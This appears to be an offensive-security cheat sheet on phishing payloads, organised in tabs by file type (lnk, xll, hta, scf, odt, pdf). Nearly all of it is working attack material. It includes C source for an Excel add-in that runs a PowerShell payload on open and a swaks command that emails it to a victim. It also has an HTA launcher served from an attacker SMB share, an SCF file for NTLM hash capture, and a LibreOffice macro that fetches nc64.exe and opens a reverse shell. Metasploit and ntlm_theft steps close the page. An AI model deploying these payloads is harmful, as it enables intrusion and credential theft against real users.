---
title: "Phishing"
date: 2024-6-26
tags: ["Phishing", "Social Engineering", "Responder", "Phishing Campaigns", "Email", "Xll", "Excel", "Hta", "Shortcut", "Windows", "Odt", "Libre", "Vba", "Ntlm_Theft", "Pdf", "Ntlm"]
---

{{< tab set1 tab1 >}}lnk{{< /tab >}}
{{< tab set1 tab2 >}}xll{{< /tab >}}
{{< tab set1 tab3 >}}hta{{< /tab >}}
{{< tab set1 tab4 >}}scf{{< /tab >}}
{{< tab set1 tab5 >}}odt{{< /tab >}}
{{< tab set1 tab6 >}}pdf{{< /tab >}}
{{< tab set1 tab7 >}}others{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
$obj = New-Object -ComObject WScript.Shell
```

```console
$link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk")
```

```console
$link.TargetPath = "C:\ProgramData\rev.exe"
```

```console
$link.Save()
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### shell.c

```console
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("<POWERSHELL_3_BASE64>", 1); // Replace your payload
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

#### 1. Compile shell.c in Linux

```console
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
```

#### 2. Send email with the malicious xll file

```console
swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
```

<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

#### 1. Start a Local SMB Server

```console
# In our local Linux machine
impacket-smbserver -smb2support share .
```

#### 2. Create a Malicious hta File in local Linux SMB share

```console
<html>
    <head>
        <HTA:APPLICATION ID="shell">
        <script language="javascript">
            var c = "<POWERSHELL_3_BASE64>";  
            new ActiveXObject('WScript.Shell').Run(c, 0, true); 
        </script>
    </head>
    <body>
        <script>self.close();</script>
    </body>
</html>
```

#### 3. Create a shortcut file in target Windows

```console
# In target Windows machine (powershell)
$url = "file://<LOCAL_IP>/share/shell.hta"
```

```console
$shortcutPath = "C:\ProgramData\shell.url"
```

```console
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
```

```console
Set-Content -Path $shortcutPath -Value $shortcutContent
```

<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

### If any interaction from target to smb share

#### 1. Start Responder

```console
# In our local Linux machine
sudo responder -I tun0
```

#### 2. Create a malicious shortcut

```console
[Shell]
Command=2

IconFile=\\<LOCAL_IP>\icon
```

#### 3. Upload the malicious shortcut

```console
# In our local Linux machine
smbclient -N \\\\<TARGET>\\share\\
```

```console
mput evil.scf
```

{{< /tabcontent >}}
{{< tabcontent set1 tab5 >}}

```console
+--------------------------------------------------------+
| 1. "Tools" > "Macros" > "Organize Macros" > "Basic..." |
| 2. "Untitled 1" > "Standard" > "New"                   |
| 3. "Paste the code below"                              |
+--------------------------------------------------------+
```

<br>

```console
Sub OnLoad
    shell("cmd /c certutil -urlcache -split -f http://<LOCAL_IP>/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd <LOCAL_IP> <LOCAL_PORT>")
End Sub
```

<br>

```console
+-----------------------------------------------------------+
| 4. "Tools" > "Organize Macros" > "Basic..." > "Assign..." |
| 5. "Events" > "Open Document" > "OK"                      |
| 6. "SAVE"                                                 |
+-----------------------------------------------------------+
```

{{< /tabcontent >}}
{{< tabcontent set1 tab6 >}}

```console
msfconsole -q
```

```console
search badpdf
```

```console
set filename evil.pdf
```

```console
set lhost <LOCAL_IP>
```

```console
exploit
```

{{< /tabcontent >}}
{{< tabcontent set1 tab7 >}}

```console
python3 ntlm_theft.py -g all -s <LOCAL_IP> -f test
```

<small>*Ref: [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)*</small>

{{< /tabcontent >}}
